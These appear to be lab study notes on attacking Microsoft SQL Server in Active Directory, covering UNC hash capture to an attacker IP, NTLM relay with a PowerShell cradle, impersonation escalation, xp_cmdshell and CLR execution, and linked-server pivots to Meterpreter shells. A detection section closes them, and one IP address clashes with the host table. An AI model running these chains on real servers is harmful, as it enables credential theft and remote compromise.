PEN-300 Module 19 — Microsoft SQL Attacks (Enumeration, UNC Injection, NTLM Relay, Impersonation, CLR, Linked Servers)

Fuente: material del curso correspondiente (sin video público)

Objective

Leverage Microsoft SQL during a penetration test to compromise Windows servers and gain additional internal access. MS SQL is targeted specifically because it is typically integrated with Active Directory (Kerberos/Windows auth, service accounts, SPNs) — though the concepts largely transfer to other database vendors. Attack path covered end to end:

  1. Enumeration — locate MS SQL instances in AD via SPNs.
  2. Authentication — an unprivileged domain user gets DB access for free through Kerberos.
  3. UNC path injection — force the SQL service account to authenticate to us (Net-NTLMv2 capture → crack or relay).
  4. Privilege escalation — EXECUTE AS impersonation misconfigurations (login level → sa; user level → dbo in msdb).
  5. Code execution — xp_cmdshell, OLE Automation (sp_OACreate/sp_OAMethod), and custom CLR assemblies (on-disk and diskless).
  6. Linked servers — enumerate links, inherit remote sa, and pivot with OPENQUERY/EXEC ... AT, including double-hop escalation through bidirectional links.

Starting assumption: a foothold as an unprivileged domain user (offsec) on a Windows 10 client, with a C# toolchain delivered over an SMB share from Kali (192.168.119.120).

Target surface

Host IP Role
dc01.corp1.com 192.168.120.5 Domain controller + MS SQL instance (lab convenience; DCs wouldn't normally host SQL)
appsrv01.corp1.com 192.168.120.6 Windows Server 2019 + MS SQL instance
Windows 10 client 192.168.120.10 Dev workstation, our foothold (domain user offsec)
Kali 192.168.119.120 Attacker (Responder, hashcat, Impacket ntlmrelayx, Metasploit, Apache, SMB toolchain share)

Domain: corp1.com. SQL service account: corp1\SQLSvc (SPN-registered, member of Builtin Administrators → local admin on both dc01 and appsrv01). Credential material captured or cracked in this module (the SQLSvc Net-NTLMv2 hash and its recovered plaintext password) is recorded here as [REDACTED].

Techniques

1. Enumerating MS SQL instances through SPNs

Network scanning (Nmap, TCP 1433) works but is noisy, and named instances use non-default ports. Since AD-integrated MS SQL runs as a service account with a registered SPN, query the DC for MSSQLSvc SPNs instead:

setspn -T corp1 -Q MSSQLSvc/*

Yields two instances: MSSQLSvc/appsrv01.corp1.com:1433 (+ :SQLEXPRESS) and MSSQLSvc/DC01.corp1.com:1433 (+ :SQLEXPRESS). Equivalent .NET route: GetUserSPNs.ps1 (in C:\Tools on the client), which additionally shows each principal's MemberOf and PasswordLastSet. Key finding: all SQL SPNs resolve to SAMAccountName: SQLSvc, MemberOf: CN=Administrators,CN=Builtin — the service account is a local administrator on every host running SQL. That single fact drives the later relay and cracking attacks.

2. MS SQL authentication — free DB access for any domain user

Authentication happens in two stages:

  • Login: a SQL server login (local per-server accounts) or Windows authentication via Kerberos with a TGS — meaning any domain user authenticates without a password.
  • User mapping: the login maps to a database user. sa maps to dbo; a login with no mapped SQL user falls back to the built-in guest user. Roles follow the user: sa/dbo → sysadmin (server admin), guest → public.

C# client (Visual Studio console app on the Windows 10 client):

String sqlServer = "dc01.corp1.com";
String database = "master";   // default DB that always exists
String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
try { con.Open(); Console.WriteLine("Auth success!"); }
catch { Console.WriteLine("Auth failed"); Environment.Exit(0); }

Integrated Security = True → Kerberos, no credentials in code. Connection succeeds — Builtin\Users has access by default and Domain Users is a member of it, so every domain account gets in. Enumerate the session with SQL queries executed through SqlCommand/SqlDataReader (always reader.Close() before the next query, or the connection blocks; index results with the zero-based reader[0]):

  • SELECT SYSTEM_USER; → SQL login: corp1\offsec
  • SELECT USER_NAME(); → mapped user: guest
  • SELECT IS_SRVROLEMEMBER('public'); / ('sysadmin'); → member of public, not sysadmin

Low privilege — but full SQL execution without any password.

3. UNC path injection — stealing the SQL service account hash

Force the SQL server to connect to an SMB share we control: the connection authenticates with NTLM, exposing the hash of the account the SQL service runs under. The undocumented xp_dirtree procedure lists folder contents and accepts SMB shares — callable from our unprivileged DB access:

EXEC master..xp_dirtree "\\192.168.119.120\test";

(Heavy escaping in C#: double quotes for SQL, doubled backslashes for UNC and C# strings. Other SQL procedures can trigger the same connection if xp_dirtree was removed.) Hostname as an IP address makes Windows fall back to NTLM instead of Kerberos. Capture side: Responder on Kali (sudo responder -I tap0; stop the Samba toolchain share first). Triggering the C# app yields:

[SMB] NTLMv2-SSP Client   : 192.168.120.5
[SMB] NTLMv2-SSP Username : corp1\SQLSvc
[SMB] NTLMv2-SSP Hash     : [REDACTED]

This is a Net-NTLM hash (NTLMv2): a challenge/response derived from the NTLM hash — it proves knowledge of the same password, and a weak-password capture can be cracked like a regular hash.

4. Cracking the captured hash

hashcat -m 5600 hash.txt dict.txt --force     # NetNTLMv2 mode; --force because we're in a VM without GPU

Status: Cracked — the SQLSvc password was weak ([REDACTED]). Since SQLSvc is local administrator on both dc01 and appsrv01, that password alone grants OS access to both servers. John the Ripper is an alternative; hashcat wants physical GPUs. Weak SQL service-account passwords are a quick OS compromise.

5. Relaying instead of cracking — ntlmrelayx

A Net-NTLM hash cannot be passed-the-hash (only the NT hash can), but it can be relayed to a different machine: if the relayed user is a local admin on the target, that's code execution. Relaying back to the origin host over the same protocol is blocked (Microsoft, 2008). SMB relaying requires SMB signing disabled — only DCs enable it by default — so relay dc01 → appsrv01, where SQLSvc is local admin on both.

Toolchain:

  1. Staged Meterpreter payload (TCP 443) embedded in the PowerShell runner run.txt, hosted with Apache on port 80; multi/handler started.
  2. Base64 the download cradle for powershell -enc (Kali pwsh: [System.Text.Encoding]::Unicode.GetBytes($text) → [Convert]::ToBase64String($bytes)).
  3. Impacket: sudo apt install python3-impacket, then
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc <B64 cradle>'

--no-http-server suppresses ntlmrelayx's own web server; -smb2support is required because it defaults to SMBv1, which is disabled on Windows Server 2019. Run the C# app on the Windows 10 client → Authenticating against smb://192.168.120.6 as CORP1/SQLSVC SUCCEED → reverse Meterpreter session from appsrv01 in the SQL service account's context — code execution without ever cracking the password, from low-privileged DB access.

6. Privilege escalation via impersonation — EXECUTE AS LOGIN

Only users granted the explicit Impersonate permission can use it — not a default — but DBA misconfigurations create escalation paths. Two flavors: login level (EXECUTE AS LOGIN) and user level (EXECUTE AS USER). A lab misconfiguration on dc01's instance: our user can impersonate sa.

Enumeration is asymmetric: we can't list which logins we may impersonate, but we can list which logins allow impersonation:

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b
  ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

(sys.server_permissions = permission rows, sys.server_principals = logins.) Result: sa allows impersonation. Exploit and confirm context:

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;   -- now shows sa

7. Privilege escalation via EXECUTE AS USER — dbo in msdb

The user-level variant matters for server-wide compromise: a database user only acts inside its database, so to reach the whole instance the impersonated sysadmin user must live in a database with the TRUSTWORTHY property set — by default only msdb. Its dbo (database owner) holds the sysadmin role. Lab: guest granted impersonation of dbo in msdb.

use msdb;
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();   -- guest → dbo → sysadmin role membership

(Use USER_NAME() here — it shows the database user; SYSTEM_USER would show the login.)

8. Code execution I — xp_cmdshell

Classic (15+ years), therefore often blocked and monitored — but the baseline. xp_cmdshell spawns a Windows command shell and returns output; disabled by default since SQL 2005. Enable as sysadmin (after the impersonation above):

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';   -- corp1\sqlsvc

Code exec runs in the SQL service account's context.

9. Code execution II — OLE Automation (sp_OACreate / sp_OAMethod)

Instantiate OLE objects instead. Both procedures are disabled by default:

EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

sp_OACreate {progid|clsid}, objecttoken OUTPUT returns a token usable only in local scope, so the calls must be stacked in one batch, and sp_OAMethod offers no output retrieval:

DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "echo Test > C:\Tools\file.txt"';

Verified by reading the created file over C$ — blind but effective execution on dc01.

10. Code execution III — custom CLR assemblies

If a database is TRUSTWORTHY, CREATE ASSEMBLY imports a managed DLL as a database object and its methods become executable stored procedures — arbitrary managed code. Build a .NET Framework Class Library; the method needs the SqlProcedure attribute:

public class StoredProcedures {
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand) { ... }
}

The procedure runs cmd.exe via System.Diagnostics.Process with UseShellExecute = false and RedirectStandardOutput = true, streaming results back to the client through SqlContext.Pipe (SqlDataRecord with SqlMetaData("output", NVarChar, 4000); SendResultsStart / SetString + SendResultsRow / SendResultsEnd).

Loading requirements:

  • The assembly must live in a TRUSTWORTHY database → target msdb (default).
  • CLR integration is off by default; SQL 2017+ also enforces CLR strict security (only signed assemblies) — both are sp_configure toggles:
use msdb;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
  • On disk: copy the DLL to the target (lab: C:\Tools on dc01 — unrealistic but instructive; Windows Server 2016 and earlier also allowed UNC paths, 2019 blocks unauthenticated SMB):
CREATE ASSEMBLY myAssembly FROM 'C:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS
    EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
EXEC cmdExec 'whoami';    -- corp1\sqlsvc

PERMISSION_SET = UNSAFE is required for unsigned .NET code. Cleanup before re-deploying: DROP PROCEDURE then DROP ASSEMBLY (a second CREATE ASSEMBLY of the same name fails).

  • Diskless: embed the DLL as a hex literal — CREATE ASSEMBLY my_assembly FROM 0x4D5A900... WITH PERMISSION_SET = UNSAFE; — so nothing touches the target's disk. Generate the hex with a PowerShell StringBuilder loop (OpenRead, $byte.ToString("X2") per byte). Same result: Result of command is: corp1\sqlsvc.

11. Linked servers — enumeration and the inherited sa

SQL instances can be linked so queries on one act on another. Link security context is either dynamic (current login's context) or — a common admin choice — a fixed SQL login. If that fixed login has sysadmin on the remote, we inherit sysadmin there even from low-priv locally.

Enumerate links (no special privilege needed):

EXEC sp_linkedservers;
-- from appsrv01: APPSRV01\SQLEXPRESS, DC01

Query a linked server with OPENQUERY in the FROM clause:

select version from openquery("dc01", 'select @@version as version');
-- MS SQL 2019 Express (15.0.32.50) on Windows Server 2019
select SYSTEM_USER from openquery("dc01", 'select SYSTEM_USER as system_user');
-- locally corp1\offsec — but on DC01 through the link: sa

12. Code execution on linked servers — OPENQUERY vs EXEC ... AT

OPENQUERY officially can't invoke stored procedures, but the AT keyword can — provided the link is configured with RPC Out (not the default, but frequently set; with sysadmin we can enable it via sp_serveroption). Enable xp_cmdshell on the remote through the link, escaping single quotes by doubling:

EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01;

For the PowerShell download cradle, Base64-encode it (-EncodedCommand) to escape the quote hell. Result: reverse Meterpreter on DC01 (192.168.120.10 — the DC). Note the SQL server process dies when the shell exits unless the payload sets EXITFUNC=thread.

13. Double-hop escalation — "Come Home To Me"

Links are not bidirectional by default — enumerate the remote's own links to follow the chain:

EXEC ('sp_linkedservers') AT DC01;   -- DC01 also links to APPSRV01

Nest OPENQUERY to read the security context two hops out — locally unprivileged, but arriving at appsrv01 as sa:

select mylogin from openquery("dc01",
  'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')');
-- sa

Nested EXEC ... AT doubles the single-quote escaping per hop (the inner string literal needs four quotes) to flip show advanced options and xp_cmdshell on appsrv01, then the same encoded-cadle pattern yields Meterpreter on APPSRV01 (192.168.120.6). Follow as many links as exist — potentially code execution across many SQL servers.

14. Tools and scope notes

  • PowerUpSQL (PowerShell) automates the enumeration/attack workflow.
  • DAFT (Database Audit Framework & Toolkit) and Evil SQL Client (ESC) — C# implementations; ESC ships prebuilt for MSBuild, useful to bypass AppLocker-style whitelisting.
  • The whole chain also applies to SQL injection: a perimeter web app with SQLi plus the misconfigurations above can compromise SQL servers deep inside the network. Other database platforms (Oracle, MySQL) have comparable misconfigurations, including cross-database-type links.

Detection & defense

  • Service accounts: SQLSvc was local admin on every host it touched — the single fact that turned one hash into two servers. Run SQL under dedicated least-privilege accounts, never local admins, and use long random passwords (the crack in this module succeeded purely on password weakness).
  • UNC path injection: xp_dirtree and siblings should not be callable by public-role users; monitor for outbound SMB from SQL servers to non-file-server hosts. Responder captures rely on NTLM — hostname-as-IP fallback — and relaying relies on SMB signing disabled; enforce SMB signing beyond DCs and audit NTLM usage.
  • Impersonation: explicit IMPERSONATE grants are non-default — audit sys.server_permissions for them, especially on service/guest accounts, and don't grant impersonation of dbo/sa holders to low-priv users.
  • TRUSTWORTHY: keep TRUSTWORTHY OFF everywhere except where strictly needed (msdb is on by default — treat msdb object creation as high-value telemetry). It gates both the EXECUTE AS USER → dbo escalation and CREATE ASSEMBLY.
  • Dangerous features off by default, keep them off: xp_cmdshell, Ole Automation Procedures, clr enabled, and clr strict security = 0 are all one sp_configure apart from code execution; alert on RECONFIGURE statements and on CREATE ASSEMBLY (diskless variant still requires it), plus on PERMISSION_SET = UNSAFE.
  • Linked servers: map every link and its security context — a fixed sysadmin login on a link converts any local user into remote sa. Disable RPC Out where procedures aren't needed, and alert on sp_linkedservers enumeration followed by EXEC ... AT (the double-hop chain is invisible without it).
  • Instance access: Builtin\Users default access means every domain user reaches the instance; remove it where the application doesn't need it.

Exercises (from the module)

  • Enumerate MS SQL via SPNs (setspn / GetUserSPNs.ps1); build and run the C# auth + enumeration client.
  • Trigger xp_dirtree against your Kali IP; capture the Net-NTLMv2 with Responder; crack it with hashcat and access appsrv01 and dc01.
  • Install Impacket, base64 the cradle, relay the hash dc01 → appsrv01 with ntlmrelayx, and catch the reverse Meterpreter.
  • Enumerate impersonation grants; escalate via EXECUTE AS LOGIN = 'sa' and via EXECUTE AS USER = 'dbo' in msdb; get shells with xp_cmdshell and with sp_OACreate/sp_OAMethod.
  • Build, compile, and load the CLR cmdExec assembly (on disk, then hex-embedded) and get output-bearing command execution.
  • Enumerate linked servers from appsrv01; enable and use xp_cmdshell on DC01 via EXEC ... AT; follow the bidirectional links to become sa on appsrv01 and repeat. Extra mile: code exec through OPENQUERY instead of AT; PowerUpSQL, DAFT, or ESC.
